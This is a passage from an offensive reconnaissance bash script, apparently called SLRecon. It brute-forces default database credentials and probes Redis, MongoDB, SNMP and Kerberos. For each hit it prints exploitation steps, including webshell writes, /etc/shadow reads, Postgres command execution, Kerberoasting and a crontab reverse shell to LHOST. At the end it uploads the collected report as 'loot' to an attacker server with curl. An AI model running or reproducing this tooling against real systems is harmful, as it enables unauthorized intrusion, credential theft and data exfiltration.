      [ -n "$OUTDIR" ] && echo "$_rdp_nla" > "$OUTDIR/rdp_ntlm.txt"
      _rec "[ENUM] RDP NTLM info leaked — domain/version info obtained:"
      _rec "  → xfreerdp /v:$TARGET /u:'' /p:''  (test null session)"
      _rec "  → crowbar -b rdp -s $TARGET/32 -U users.txt -C passwords.txt  (bruteforce)"
    fi
  fi

  # ── MySQL ──
  if _has_port 3306; then
    section "MySQL (3306)"
    if _has mysql; then
      info "Testing default credentials..."
      for _mu in root mysql admin; do
        for _mp in "" "root" "mysql" "password" "toor"; do
          _mres=$(mysql -h "$TARGET" -u "$_mu" -p"$_mp" -e "SELECT VERSION();" 2>/dev/null) || true
          if [ -n "$_mres" ]; then
            hi "MySQL login SUCCESS: $_mu / $_mp"
            emit "$_mres"
            _mysql_dbs=$(mysql -h "$TARGET" -u "$_mu" -p"$_mp" -e "SHOW DATABASES;" 2>/dev/null) || true
            [ -n "$_mysql_dbs" ] && emit "$_mysql_dbs"
            [ -n "$OUTDIR" ] && { echo "Credentials: $_mu:$_mp"; echo "$_mres"; echo "$_mysql_dbs"; } > "$OUTDIR/mysql.txt"
            _rec "[PRIVESC] MySQL accessible with $_mu:$_mp — next steps:"
            _rec "  → mysql -h $TARGET -u $_mu -p'$_mp'"
            _rec "  → SHOW DATABASES; USE <db>; SHOW TABLES; SELECT * FROM users;"
            _rec "  → SELECT load_file('/etc/shadow');"
            _rec "  → SELECT '<?php system(\$_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';"
            _rec "  → UDF exploit: searchsploit mysql udf"
            break 2
          fi
        done
      done
    else
      warn "mysql client not installed"
    fi
  fi

  # ── PostgreSQL ──
  if _has_port 5432; then
    section "PostgreSQL (5432)"
    if _has psql; then
      info "Testing default credentials..."
      for _pu in postgres admin; do
        for _pp in "" "postgres" "password" "admin"; do
          _pres=$(PGPASSWORD="$_pp" psql -h "$TARGET" -U "$_pu" -c "SELECT version();" 2>/dev/null) || true
          if [ -n "$_pres" ]; then
            hi "PostgreSQL login SUCCESS: $_pu / $_pp"
            emit "$_pres"
            _pg_dbs=$(PGPASSWORD="$_pp" psql -h "$TARGET" -U "$_pu" -c "\\l" 2>/dev/null) || true
            [ -n "$_pg_dbs" ] && emit "$_pg_dbs"
            [ -n "$OUTDIR" ] && { echo "Credentials: $_pu:$_pp"; echo "$_pres"; echo "$_pg_dbs"; } > "$OUTDIR/postgresql.txt"
            _rec "[PRIVESC] PostgreSQL accessible with $_pu:$_pp — next steps:"
            _rec "  → PGPASSWORD='$_pp' psql -h $TARGET -U $_pu"
            _rec "  → \\l (list databases), \\dt (list tables), SELECT * FROM users;"
            _rec "  → COPY (SELECT '') TO PROGRAM 'id';  (RCE as postgres user)"
            _rec "  → SELECT pg_read_file('/etc/passwd');"
            break 2
          fi
        done
      done
    else
      warn "psql client not installed"
    fi
  fi

  # ── Redis ──
  if _has_port 6379; then
    section "Redis (6379)"
    _redis=$(echo "INFO server" | nc -w 3 "$TARGET" 6379 2>/dev/null) || true
    if echo "$_redis" | grep -q "redis_version"; then
      hi "Redis NO AUTH — accessible without password"
      _redis_ver=$(echo "$_redis" | grep "redis_version:" | cut -d: -f2 | tr -d '\r')
      info "Redis version: $_redis_ver"
      [ -n "$OUTDIR" ] && echo "$_redis" > "$OUTDIR/redis_info.txt"
      _redis_keys=$(echo "KEYS *" | nc -w 3 "$TARGET" 6379 2>/dev/null) || true
      if [ -n "$_redis_keys" ]; then
        emit "$_redis_keys"
        [ -n "$OUTDIR" ] && echo "$_redis_keys" >> "$OUTDIR/redis_info.txt"
      fi
      _rec "[PRIVESC] Redis no-auth on :6379 (v$_redis_ver) — exploitation paths:"
      _rec "  → redis-cli -h $TARGET"
      _rec "  → KEYS *  →  GET <key>  (dump all data)"
      _rec "  → Webshell: CONFIG SET dir /var/www/html/; CONFIG SET dbfilename shell.php; SET x '<?php system(\$_GET[c]); ?>'; SAVE"
      _rec "  → SSH key: CONFIG SET dir /root/.ssh/; CONFIG SET dbfilename authorized_keys; SET x '<your_pubkey>'; SAVE"
      _rec "  → Crontab: CONFIG SET dir /var/spool/cron/crontabs/; CONFIG SET dbfilename root; SET x '\\n* * * * * bash -i >& /dev/tcp/LHOST/PORT 0>&1\\n'; SAVE"
    fi
  fi

  # ── MongoDB ──
  if _has_port 27017; then
    section "MongoDB (27017)"
    if _has mongosh; then
      _mongo=$(mongosh --host "$TARGET" --eval "db.adminCommand('listDatabases')" --quiet 2>/dev/null) || true
      if [ -n "$_mongo" ]; then
        hi "MongoDB NO AUTH — listing databases"
        emit "$_mongo"
        [ -n "$OUTDIR" ] && echo "$_mongo" > "$OUTDIR/mongodb.txt"
        _rec "[PRIVESC] MongoDB no-auth on :27017 — next steps:"
        _rec "  → mongosh --host $TARGET"
        _rec "  → show dbs; use <db>; show collections; db.<collection>.find()"
        _rec "  → Search for creds: db.<collection>.find({}, {password:1, passwd:1, secret:1})"
      fi
    fi
  fi

  # ── SNMP ──
  if _has onesixtyone; then
    section "SNMP (161)"
    info "SNMP community string bruteforce..."
    _snmp_out=$(onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt "$TARGET" 2>/dev/null) || true
    if [ -z "$_snmp_out" ]; then
      _snmp_out=$(echo "public\nprivate\ncommunity" | onesixtyone -c /dev/stdin "$TARGET" 2>/dev/null) || true
    fi
    if [ -n "$_snmp_out" ] && ! echo "$_snmp_out" | grep -qi "timed out"; then
      hi "SNMP community string found"
      emit "$_snmp_out"
      [ -n "$OUTDIR" ] && echo "$_snmp_out" > "$OUTDIR/snmp.txt"
      _snmp_community=$(echo "$_snmp_out" | head -1 | grep -oE '\[.*\]' | tr -d '[]')
      [ -z "$_snmp_community" ] && _snmp_community="public"
      _rec "[ENUM] SNMP accessible (community: $_snmp_community) — enumerate:"
      _rec "  → snmpwalk -v2c -c $_snmp_community $TARGET"
      _rec "  → snmpwalk -v2c -c $_snmp_community $TARGET 1.3.6.1.2.1.25.4.2.1.2  (running processes)"
      _rec "  → snmpwalk -v2c -c $_snmp_community $TARGET 1.3.6.1.2.1.25.6.3.1.2  (installed software)"
      _rec "  → snmpwalk -v2c -c $_snmp_community $TARGET 1.3.6.1.4.1.77.1.2.25    (users)"
    fi
  fi

  # ── Kerberos ──
  if _has_port 88; then
    section "Kerberos (88)"
    if _has kerbrute; then
      info "Kerberos user enumeration..."
      _krb_wl=""
      for _kwl in /usr/share/seclists/Usernames/xato-net-10-million-usernames-nt.txt \
                  /usr/share/seclists/Usernames/Names/names.txt; do
        [ -f "$_kwl" ] && _krb_wl="$_kwl" && break
      done
      if [ -n "$_krb_wl" ]; then
        _krb_out=$(kerbrute userenum -d "$TARGET" --dc "$TARGET" "$_krb_wl" 2>/dev/null) || true
        if [ -n "$_krb_out" ]; then
          echo "$_krb_out" | grep "VALID" | while IFS= read -r line; do
            hi "$line"
          done
          [ -n "$OUTDIR" ] && echo "$_krb_out" | grep "VALID" > "$OUTDIR/kerberos_users.txt"
          _rec "[ENUM] Valid Kerberos users found — next steps:"
          _rec "  → See $OUTDIR/kerberos_users.txt"
          _rec "  → AS-REP roast: GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip $TARGET -format hashcat"
          _rec "  → Kerberoast: GetUserSPNs.py <domain>/<user>:<pass> -dc-ip $TARGET -request"
          _rec "  → Password spray: kerbrute passwordspray -d <domain> --dc $TARGET users.txt 'Password1'"
        fi
      fi
    fi
  fi

  info "Service enumeration completed ($(_elapsed))"
}

# ══════════════════════════════════════════════════════════════
#              PHASE 4 — REPORT
# ══════════════════════════════════════════════════════════════
phase_report() {
  phase_hdr "REPORT"

  section "ATTACK SURFACE SUMMARY"

  # Port summary
  if [ -f "$OUTDIR/open_ports.txt" ]; then
    info "Open ports: $(cat "$OUTDIR/open_ports.txt")"
  fi

  # Service versions from nmap
  if [ -f "$OUTDIR/nmap_services.txt" ]; then
    emit_raw "\n${W}--- Service versions ---${N}"
    grep -E '^[0-9]+/tcp.*open' "$OUTDIR/nmap_services.txt" 2>/dev/null | while IFS= read -r line; do
      _svc_ver=$(echo "$line" | sed 's/  */ /g')
      info "$_svc_ver"
      _ver=$(echo "$_svc_ver" | awk '{for(i=4;i<=NF;i++) printf "%s ", $i; print ""}')
      if [ -n "$_ver" ]; then
        _rec "[ENUM] Service version → search: $_ver exploit / CVE"
      fi
    done
  fi

  # ── Recommendations ──
  section "RECOMMENDATIONS"

  if [ -s "$_RECS_FILE" ]; then
    _privesc=0; _enum=0; _info=0; _warn=0

    while IFS= read -r _r; do
      case "$_r" in
        \[PRIVESC\]*) _privesc=$((_privesc + 1)) ;;
        \[ENUM\]*)    _enum=$((_enum + 1)) ;;
        \[INFO\]*)    _info=$((_info + 1)) ;;
        \[WARN\]*)    _warn=$((_warn + 1)) ;;
      esac
    done < "$_RECS_FILE"

    emit_raw "${R}  Privilege Escalation vectors: $_privesc${N}"
    emit_raw "${Y}  Enumeration leads: $_enum${N}"
    emit_raw "${G}  Informational: $_info${N}"
    [ "$_warn" -gt 0 ] && emit_raw "${Y}  Warnings: $_warn${N}"
    emit_raw ""

    if [ "$_privesc" -gt 0 ]; then
      emit_raw "${R}--- Privilege Escalation ---${N}"
      grep '^\[PRIVESC\]' "$_RECS_FILE" | sort -u | while IFS= read -r _r; do
        emit_raw "${R}  ► ${_r#\[PRIVESC\] }${N}"
      done
      emit_raw ""
    fi

    if [ "$_enum" -gt 0 ]; then
      emit_raw "${Y}--- Enumeration ---${N}"
      grep '^\[ENUM\]' "$_RECS_FILE" | sort -u | while IFS= read -r _r; do
        emit_raw "${Y}  ► ${_r#\[ENUM\] }${N}"
      done
      emit_raw ""
    fi

    if [ "$_info" -gt 0 ]; then
      emit_raw "${G}--- Informational ---${N}"
      grep '^\[INFO\]' "$_RECS_FILE" | sort -u | while IFS= read -r _r; do
        emit_raw "${G}  ► ${_r#\[INFO\] }${N}"
      done
      emit_raw ""
    fi

    if [ "$_warn" -gt 0 ]; then
      emit_raw "${Y}--- Warnings ---${N}"
      grep '^\[WARN\]' "$_RECS_FILE" | sort -u | while IFS= read -r _r; do
        emit_raw "${Y}  ► ${_r#\[WARN\] }${N}"
      done
      emit_raw ""
    fi
  else
    info "No notable findings."
  fi

  # Timeline
  _end_time=$(date +%s)
  _total=$((_end_time - START_TIME))
  _tmin=$((_total / 60))
  _tsec=$((_total % 60))
  emit_raw "\n${W}Total scan time: ${_tmin}m${_tsec}s${N}"
}

# ══════════════════════════════════════════════════════════════
#                         RUN
# ══════════════════════════════════════════════════════════════

if [ -n "$PHASE" ]; then
  case "$PHASE" in
    ports)    phase_ports ;;
    web)      phase_web ;;
    services) phase_services ;;
    report)   phase_report ;;
    *)        echo "Unknown phase: $PHASE (use: ports, web, services, report)"; exit 1 ;;
  esac
  phase_report
else
  phase_ports
  phase_web
  [ "$FAST" -eq 0 ] && phase_services
  phase_report
fi

# ── Scan complete banner ─────────────────────────────────────
emit_raw ""
emit_raw "${B}╔══════════════════════════════════════════════╗${N}"
emit_raw "${B}║${G}        SLRecon scan complete                  ${B}║${N}"
emit_raw "${B}╚══════════════════════════════════════════════╝${N}"
emit_raw ""

# ── Save/upload ──────────────────────────────────────────────
if [ -n "$OUTDIR" ] && [ -f "$OUTDIR/report.txt" ]; then
  _lines=$(wc -l < "$OUTDIR/report.txt" 2>/dev/null || echo "?")
  printf "\033[1;32m[+] Report saved to: %s/report.txt (%s lines)\033[0m\n" "$OUTDIR" "$_lines"
fi

if [ "$LOOT" -eq 1 ] && [ -n "$OUTDIR" ] && [ -f "$OUTDIR/report.txt" ]; then
  _uploaded=0
  if [ -n "$LHOST" ]; then
    if [ -n "$SLPORT" ]; then
      _ports="$SLPORT"
    else
      _ports="2727 2020 8080 8000 80 8443 9090"
    fi
    for _port in $_ports; do
      if curl -sf -m 3 -F "file=@${OUTDIR}/report.txt;filename=recon_${TARGET}.txt" "http://${LHOST}:${_port}/upload" >/dev/null 2>&1; then
        printf "\033[1;32m[+] Uploaded to loot: http://%s:%s/upload (recon_%s.txt)\033[0m\n" "$LHOST" "$_port" "$TARGET"
        _uploaded=1
        break
      fi
    done
  fi
  if [ "$_uploaded" -eq 0 ]; then
    printf "\033[1;33m[*] Loot upload failed — could not reach SeaLion server\033[0m\n"
  fi
fi

rm -f "$_RECS_FILE"

if [ "$SILENT" -eq 1 ]; then
  printf "\033[1;32m[+] SLRecon scan complete.\033[0m"
  [ -n "$OUTDIR" ] && printf " \033[1;32mOutput: %s/\033[0m" "$OUTDIR"
  printf "\n"
fi
